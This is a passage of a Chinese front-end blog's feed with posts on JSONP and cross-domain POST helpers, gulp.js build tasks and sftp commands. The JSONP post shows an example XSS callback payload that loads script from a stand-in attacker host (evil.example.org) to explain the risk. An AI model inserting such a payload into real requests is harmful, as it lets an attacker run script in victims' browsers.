&lt;p&gt;本篇文章就是为了我去前端笔试面试而写的，参考 &lt;a href=&quot;http://www.webdevout.net/css-hacks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSS hacks&lt;/a&gt; 和 &lt;a href=&quot;http://browserhacks.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Browserhacks&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="css hacks" scheme="http://youngdze.co/tags/css-hacks/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 跨域请求</title>
    <link href="http://youngdze.co/2015/10/14/javascript-csrf/"/>
    <id>http://youngdze.co/2015/10/14/javascript-csrf/</id>
    <published>2015-10-14T13:19:07.000Z</published>
    <updated>2016-12-05T05:36:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>以下是一个 ECMAScript6 版本的 JSONP 方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> jsonpLoad = <span class="function">(<span class="params">url</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</div><div class="line">    <span class="keyword">const</span> timeout = <span class="number">5000</span>;</div><div class="line"></div><div class="line">    Element.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.parentNode.removeChild(<span class="keyword">this</span>);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">const</span> callback = <span class="string">`__callback<span class="subst">$&#123;index++&#125;</span>`</span>;</div><div class="line">    <span class="keyword">const</span> timeoutID = <span class="built_in">window</span>.setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">        reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Request timeout.'</span>));</div><div class="line">    &#125;, timeout);</div><div class="line"></div><div class="line">    <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">    script.type = <span class="string">'text/javascript'</span>;</div><div class="line">    script.async = <span class="literal">true</span>;</div><div class="line">    script.src = <span class="string">`<span class="subst">$&#123;url&#125;</span><span class="subst">$&#123;!~url.indexOf(<span class="string">'?'</span>)? <span class="string">'?'</span>: <span class="string">'&amp;'</span>&#125;</span>callback=<span class="subst">$&#123;callback&#125;</span>`</span>;</div><div class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'head'</span>).appendChild(script);</div><div class="line"></div><div class="line">    <span class="built_in">window</span>[callback] = <span class="function"><span class="params">res</span> =&gt;</span> &#123;</div><div class="line">        script.remove();</div><div class="line">        <span class="built_in">window</span>.clearTimeout(timeoutID);</div><div class="line">        resolve(res);</div><div class="line">    &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure><a id="more"></a><p>jsonp 的缺点是容易导致 XSS 跨域攻击，比如下面这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://example.org/api.php?callback=$.getScript(&apos;//evil.example.org/xss.js&apos;);var dontcare=(</div></pre></td></tr></table></figure><p>会变为这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$.getScript(<span class="string">'http://evil.example.org/xss.js'</span>);<span class="keyword">var</span> dontcare= (&#123; ... &#125;);</div></pre></td></tr></table></figure><p>所以 jsonp 只能用在自己信任的站点。</p><p>下面是一个跨域的 post 请求，但只能 post，不能获得 post 返回的数据，原理是创建一个 iframe 进行 post：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">'use strict'</span>;</div><div class="line"></div><div class="line"><span class="keyword">let</span> crossDomainPost = <span class="function">(<span class="params">url, name, value</span>) =&gt;</span> &#123;</div><div class="line">    Element.prototype.remove = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">        <span class="keyword">this</span>.parentNode.removeChild(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</div><div class="line">    <span class="keyword">let</span> uniqueString = <span class="string">'CHANGE_THIS_TO_SOME_UNIQUE_STRING'</span>;</div><div class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</div><div class="line">    iframe.style.display = <span class="string">'none'</span>;</div><div class="line">    iframe.contentWindow.name = uniqueString;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</div><div class="line">    form.target = uniqueString;</div><div class="line">    form.action = url;</div><div class="line">    form.method = <span class="string">'POST'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> input = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</div><div class="line">    input.type = <span class="string">'hidden'</span>;</div><div class="line">    input.name = name;</div><div class="line">    input.value = value;</div><div class="line">    form.appendChild(input);</div><div class="line"></div><div class="line">    <span class="built_in">document</span>.body.appendChild(form);</div><div class="line">    form.submit();</div><div class="line"></div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">        iframe.remove();</div><div class="line">        form.remove();</div><div class="line">    &#125;, <span class="number">5000</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>另外一个是 postMessage 跨域请求，解释请看<a href="http://www.cnblogs.com/dolphinX/p/3464056.html" target="_blank" rel="external">html5 postMessage解决跨域、跨窗口消息传递</a></p><p>参考：</p><ul><li><a href="http://stackoverflow.com/questions/8750469/apparent-jsonp-xss-vulnerability" target="_blank" rel="external">http://stackoverflow.com/questions/8750469/apparent-jsonp-xss-vulnerability</a></li><li><a href="http://stackoverflow.com/questions/298745/how-do-i-send-a-cross-domain-post-request-via-javascript" target="_blank" rel="external">http://stackoverflow.com/questions/298745/how-do-i-send-a-cross-domain-post-request-via-javascript</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以下是一个 ECMAScript6 版本的 JSONP 方法：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; jsonpLoad = &lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;url&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; index = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; timeout = &lt;span class=&quot;number&quot;&gt;5000&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Element.prototype.remove = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.parentNode.removeChild(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Promise&lt;/span&gt;(&lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;resolve, reject&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; callback = &lt;span class=&quot;string&quot;&gt;`__callback&lt;span class=&quot;subst&quot;&gt;$&amp;#123;index++&amp;#125;&lt;/span&gt;`&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; timeoutID = &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        reject(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Error&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Request timeout.&#39;&lt;/span&gt;));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;, timeout);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; script = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;script&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    script.type = &lt;span class=&quot;string&quot;&gt;&#39;text/javascript&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    script.async = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    script.src = &lt;span class=&quot;string&quot;&gt;`&lt;span class=&quot;subst&quot;&gt;$&amp;#123;url&amp;#125;&lt;/span&gt;&lt;span class=&quot;subst&quot;&gt;$&amp;#123;!~url.indexOf(&lt;span class=&quot;string&quot;&gt;&#39;?&#39;&lt;/span&gt;)? &lt;span class=&quot;string&quot;&gt;&#39;?&#39;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;&#39;&lt;/span&gt;&amp;#125;&lt;/span&gt;callback=&lt;span class=&quot;subst&quot;&gt;$&amp;#123;callback&amp;#125;&lt;/span&gt;`&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelector(&lt;span class=&quot;string&quot;&gt;&#39;head&#39;&lt;/span&gt;).appendChild(script);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;[callback] = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;res&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        script.remove();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.clearTimeout(timeoutID);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        resolve(res);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="csrf" scheme="http://youngdze.co/tags/csrf/"/>
    
      <category term="jsonp" scheme="http://youngdze.co/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>gulp.js 基础</title>
    <link href="http://youngdze.co/2015/09/24/gulpjs-basis/"/>
    <id>http://youngdze.co/2015/09/24/gulpjs-basis/</id>
    <published>2015-09-24T01:40:09.000Z</published>
    <updated>2016-12-05T05:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>想了解 <strong>gulpjs</strong> 是什么可以看<a href="http://gulpjs.com/" target="_blank" rel="external">官网</a>。</p></blockquote><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>我已经写好一个项目的 <code>gulpfile.js</code>，其中用到的 <strong>gulpjs</strong> 插件包括 <code>gulp-less</code>、<code>gulp-coffee</code>、<code>gulp-util</code>、<code>webpack</code>、<code>gulp-uglify</code>、<code>gulp-rename</code>。</p><a id="more"></a><p>首先写好 <code>package.json</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"name"</span>: <span class="string">"gulp-example"</span>,</div><div class="line">    <span class="attr">"author"</span>: <span class="string">"youngdze"</span>,</div><div class="line">    <span class="attr">"devDependencies"</span>: &#123;</div><div class="line">    <span class="attr">"coffee-script"</span>: <span class="string">"^1.10.0"</span>,</div><div class="line">    <span class="attr">"gulp"</span>: <span class="string">"^3.9.0"</span>,</div><div class="line">    <span class="attr">"gulp-coffee"</span>: <span class="string">"^2.3.1"</span>,</div><div class="line">    <span class="attr">"gulp-jshint"</span>: <span class="string">"^1.11.2"</span>,</div><div class="line">    <span class="attr">"gulp-less"</span>: <span class="string">"^3.0.3"</span>,</div><div class="line">    <span class="attr">"gulp-rename"</span>: <span class="string">"^1.2.2"</span>,</div><div class="line">    <span class="attr">"gulp-uglify"</span>: <span class="string">"^1.4.0"</span>,</div><div class="line">    <span class="attr">"gulp-util"</span>: <span class="string">"^3.0.6"</span>,</div><div class="line">    <span class="attr">"gulp-watch"</span>: <span class="string">"^4.3.5"</span>,</div><div class="line">    <span class="attr">"webpack"</span>: <span class="string">"^1.12.1"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"scripts"</span>: &#123;</div><div class="line">    <span class="attr">"prestart"</span>: <span class="string">"gulp"</span>,</div><div class="line">    <span class="attr">"start"</span>: <span class="string">"node --harmony server.js"</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>npm install</code> 先安装。</p><p>安装完成后在 <code>gulpfile.js</code> 引入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">"use strict"</span>;</div><div class="line"></div><div class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</div><div class="line"><span class="keyword">var</span> less = <span class="built_in">require</span>(<span class="string">'gulp-less'</span>);</div><div class="line"><span class="keyword">var</span> coffee = <span class="built_in">require</span>(<span class="string">'gulp-coffee'</span>);</div><div class="line"><span class="keyword">var</span> gutil = <span class="built_in">require</span>(<span class="string">'gulp-util'</span>);</div><div class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</div><div class="line"><span class="keyword">var</span> webpackConfig = <span class="built_in">require</span>(<span class="string">'./webpack.config.js'</span>);</div><div class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</div><div class="line"><span class="keyword">var</span> rename = <span class="built_in">require</span>(<span class="string">'gulp-rename'</span>);</div></pre></td></tr></table></figure><p>其中 <code>webpack.config.js</code> 需要具体了解请去看 <strong>webpack</strong> <a href="http://webpack.github.io/docs/configuration.html" target="_blank" rel="external">官网解释</a>，我的内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">"use strict"</span>;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">    context:__dirname + <span class="string">"/public"</span>,</div><div class="line">    entry  :[<span class="string">"./src/getFruits.js"</span>, <span class="string">"./src/id3.js"</span>],</div><div class="line">    output :&#123;</div><div class="line">    path    :__dirname + <span class="string">"/public/build"</span>,</div><div class="line">    filename:<span class="string">"./bundle.js"</span></div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><h4 id="gulp-task"><a href="#gulp-task" class="headerlink" title="gulp task"></a>gulp task</h4><p>其实 <em>gulp task</em> 的写法基本一样的，不过像 <strong>webpack</strong> 的不一样，以下会说明。</p><h5 id="gulp-less"><a href="#gulp-less" class="headerlink" title="gulp-less"></a>gulp-less</h5><p><code>gulp.src</code> 读取开发目录，<code>pipe</code> 指明任务，<code>gulp.dest</code> 指明保存目录。</p><p>像这些插件详细的配置可以去它们官方文档查看。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'less'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/src/*.less'</span>)</div><div class="line">    .pipe(less(&#123;</div><div class="line">        globalVars:&#123;</div><div class="line">        ENV: <span class="string">'dev'</span>,</div><div class="line">        version: <span class="number">10</span></div><div class="line">        &#125;</div><div class="line">    &#125;))</div><div class="line">    .pipe(gulp.dest(<span class="string">'public/build'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="gulp-coffee"><a href="#gulp-coffee" class="headerlink" title="gulp-coffee"></a>gulp-coffee</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'coffee'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/src/*.coffee'</span>)</div><div class="line">    .pipe(coffee(&#123;<span class="attr">bare</span>: <span class="literal">true</span>&#125;))</div><div class="line">    .on(<span class="string">'error'</span>, gutil.log)</div><div class="line">    .pipe(gulp.dest(<span class="string">'public/src'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h5><p><strong>webpack</strong> 没有对应的 <strong>gulpjs</strong> 查看，所以这里用的是 <strong>webpack</strong> 官方提供的写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'webpack'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> callback </span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> webpack(webpackConfig, <span class="function"><span class="keyword">function</span>(<span class="params"> err, stats </span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(err) <span class="keyword">throw</span> <span class="keyword">new</span> gutil.PluginError(<span class="string">'webpack'</span>, err);</div><div class="line">    gutil.log(<span class="string">'[webpack]'</span>, stats.toString(&#123;&#125;));</div><div class="line">    callback();</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="gulp-uglify"><a href="#gulp-uglify" class="headerlink" title="gulp-uglify"></a>gulp-uglify</h5><p>这里是压缩功能，包括用 <code>gulp-rename</code> 修改生成文件的后缀：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'compress'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/build/bundle.js'</span>)</div><div class="line">    .pipe(uglify())</div><div class="line">    .pipe(rename(&#123;</div><div class="line">        extname:<span class="string">'.min.js'</span></div><div class="line">    &#125;))</div><div class="line">    .pipe(gulp.dest(<span class="string">'public/build'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="default"><a href="#default" class="headerlink" title="default"></a>default</h4><p>如果没有写好 <code>gulp.task(&#39;default&#39;)</code> 就要指定 <code>gulp</code> 运行的参数，比如 <code>gulp compress</code>，写好只要 <code>gulp</code> 即可统一执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'less'</span>, <span class="string">'coffee'</span>, <span class="string">'webpack'</span>, <span class="string">'compress'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    gulp.watch(<span class="string">'public/src/*.less'</span>, [<span class="string">'less'</span>]);</div><div class="line">    gulp.watch(<span class="string">'public/src/*.coffee'</span>, [<span class="string">'coffee'</span>]);</div><div class="line">    gulp.watch(<span class="string">'public/src/*.js'</span>, [<span class="string">'webpack'</span>]);</div><div class="line">    gulp.watch(<span class="string">'public/build/bundle.js'</span>, [<span class="string">'compress'</span>]);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;想了解 &lt;strong&gt;gulpjs&lt;/strong&gt; 是什么可以看&lt;a href=&quot;http://gulpjs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官网&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;引入&quot;&gt;&lt;a href=&quot;#引入&quot; class=&quot;headerlink&quot; title=&quot;引入&quot;&gt;&lt;/a&gt;引入&lt;/h4&gt;&lt;p&gt;我已经写好一个项目的 &lt;code&gt;gulpfile.js&lt;/code&gt;，其中用到的 &lt;strong&gt;gulpjs&lt;/strong&gt; 插件包括 &lt;code&gt;gulp-less&lt;/code&gt;、&lt;code&gt;gulp-coffee&lt;/code&gt;、&lt;code&gt;gulp-util&lt;/code&gt;、&lt;code&gt;webpack&lt;/code&gt;、&lt;code&gt;gulp-uglify&lt;/code&gt;、&lt;code&gt;gulp-rename&lt;/code&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="NodeJS" scheme="http://youngdze.co/categories/NodeJS/"/>
    
    
      <category term="gulpjs" scheme="http://youngdze.co/tags/gulpjs/"/>
    
  </entry>
  
  <entry>
    <title>使用 sftp 与服务器进行文件传输</title>
    <link href="http://youngdze.co/2015/09/14/use-sftp-transfer-files-with-remote-server/"/>
    <id>http://youngdze.co/2015/09/14/use-sftp-transfer-files-with-remote-server/</id>
    <published>2015-09-14T02:01:04.000Z</published>
    <updated>2016-12-05T05:37:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>使用 <strong>sftp</strong> 与服务器进行文件传输比 <strong>ftp</strong> 要安全。</p><h4 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sftp username@remote_hostname_or_IP</div></pre></td></tr></table></figure><a id="more"></a><h4 id="服务器操作"><a href="#服务器操作" class="headerlink" title="服务器操作"></a>服务器操作</h4><p><strong>sftp</strong> 在服务器的操作和 <strong>ssh</strong> 在服务器的操作是一样的，都可以用 <code>ls</code>, <code>pwd</code>, <code>cd</code> 等命令。</p><h4 id="本地操作"><a href="#本地操作" class="headerlink" title="本地操作"></a>本地操作</h4><p><strong>sftp</strong> 操作本地可以在命令前加个 <code>l</code> 表示 <em>local</em>，比如 <code>ls</code> 就要 <code>lls</code>，<code>mkdir</code> 用 <code>lmkdir</code>。 也可以输入 <code>!</code> 进入本地 <em>shell</em> 操作，使用 <code>exit</code> 退出。</p><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p>上传命令为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">put localFile</div></pre></td></tr></table></figure><h4 id="上传文件夹"><a href="#上传文件夹" class="headerlink" title="上传文件夹"></a>上传文件夹</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">put -r localDir</div></pre></td></tr></table></figure><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>下载命令为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get remoteFile</div></pre></td></tr></table></figure><h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get remoteFile localName</div></pre></td></tr></table></figure><h4 id="下载文件夹并保留权限"><a href="#下载文件夹并保留权限" class="headerlink" title="下载文件夹并保留权限"></a>下载文件夹并保留权限</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">get -Pr remoteFile</div></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server" target="_blank" rel="external">How To Use SFTP to Securely Transfer Files with a Remote Server</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 &lt;strong&gt;sftp&lt;/strong&gt; 与服务器进行文件传输比 &lt;strong&gt;ftp&lt;/strong&gt; 要安全。&lt;/p&gt;
